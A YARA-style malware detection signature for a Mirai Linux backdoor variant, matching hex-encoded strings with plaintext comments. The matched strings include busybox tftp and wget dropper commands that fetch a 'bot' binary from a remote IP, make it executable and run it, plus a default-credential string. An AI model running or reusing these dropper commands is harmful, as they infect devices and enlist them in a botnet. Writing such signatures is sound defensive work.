
rule Backdoor_Linux_Mirai_CF_MTB{
	meta:
		description = "Backdoor:Linux/Mirai.CF!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,02 00 02 00 04 00 00 "
		
	strings :
		$a_00_0 = {47 45 54 20 2f 62 6f 74 2e 73 68 } //1 GET /bot.sh
		$a_00_1 = {61 64 6d 69 6e 58 58 58 58 31 32 33 34 } //1 adminXXXX1234
		$a_00_2 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 74 66 74 70 20 2d 72 20 62 6f 74 2e 25 73 20 2d 6c 20 2e 62 20 2d 67 20 25 64 2e 25 64 2e 25 64 2e 25 64 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 37 37 37 20 2e 62 3b 20 2e 2f 2e 62 20 73 63 61 6e 2e 74 66 74 70 2e 25 73 } //2 /bin/busybox tftp -r bot.%s -l .b -g %d.%d.%d.%d; /bin/busybox chmod 777 .b; ./.b scan.tftp.%s
		$a_00_3 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f 25 64 2e 25 64 2e 25 64 2e 25 64 2f 62 6f 74 2e 25 73 20 2d 4f 20 2d 3e 20 2e 62 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64 20 37 37 37 20 2e 62 3b 20 2e 2f 2e 62 20 73 63 61 6e 2e 77 67 65 74 2e 25 73 3b 20 3e 2e 62 } //2 /bin/busybox wget http://%d.%d.%d.%d/bot.%s -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.%s; >.b
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*2+(#a_00_3  & 1)*2) >=2
 
}